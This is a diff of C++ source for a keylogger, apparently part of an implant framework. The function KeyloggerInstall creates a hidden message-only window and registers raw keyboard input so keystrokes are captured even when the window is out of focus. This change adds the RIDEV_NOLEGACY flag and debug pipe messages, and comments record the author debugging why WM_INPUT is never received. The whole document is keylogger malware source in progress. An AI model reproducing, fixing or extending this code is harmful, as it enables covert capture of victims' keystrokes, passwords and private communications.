@@ -59,18 +59,13 @@ auto DECLFN KeyloggerInstall(
 	teststr = "[+] Registered Window Class: \n";
     SafePipeWrite(teststr, Str::LengthA(teststr));
     
-	teststr = "[*] Creating Message-Only Window 111...\n";
+	teststr = "[*] Creating Message-Only Window ...\n";
     SafePipeWrite(teststr, Str::LengthA(teststr));
 
-	// NEED TO FIX BELOW CODE : issue in creating a message-only window
     HWND WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);
-	//HWND WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, KEYLOG_CLASS_NAME, WS_OVERLAPPEDWINDOW & ~WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);
+
     DWORD err = NtCurrentTeb()->LastErrorValue;
 	Instance->Win32.DbgPrint("CreateWindowExW err: %d\n", err);
-
-	// not reaching here
-    teststr = "[*] Creating Message-Only Window...\n";
-    SafePipeWrite(teststr, Str::LengthA(teststr));
 
 	Instance->Win32.DbgPrint("\n\n=======================\n[+] WindowHandle: %p\n\n", WindowHandle);
 
@@ -89,7 +84,7 @@ auto DECLFN KeyloggerInstall(
 
     RawDevice.usUsagePage = HID_USAGE_PAGE_GENERIC;     // Generic Desktop Controls
     RawDevice.usUsage     = HID_USAGE_GENERIC_KEYBOARD; // Keyboard
-    RawDevice.dwFlags     = RIDEV_INPUTSINK;            // Receive input even when not in focus
+    RawDevice.dwFlags     = RIDEV_INPUTSINK | RIDEV_NOLEGACY;            // Receive input even when not in focus
     RawDevice.hwndTarget  = WindowHandle;               // Our message-only window
 
     if (!Instance->Win32.RegisterRawInputDevices(&RawDevice, 1, sizeof(RAWINPUTDEVICE)))
@@ -208,10 +203,16 @@ auto DECLFN CALLBACK WndCallback(
     switch (Message)
     {
         case WM_DESTROY:
+            SafePipeWrite("[+] WM_DESTROY received\n", 23);
+
             Instance->Win32.PostQuitMessage(0);
             return 0;
 
         case WM_INPUT:
+
+            // this is not reaching in the code ????
+			SafePipeWrite("[+] WM_INPUT received\n", 21);
+
             // Determine size of the input data
             Instance->Win32.GetRawInputData((HRAWINPUT)LParam, RID_INPUT, NULL, &Length, sizeof(RAWINPUTHEADER));
 
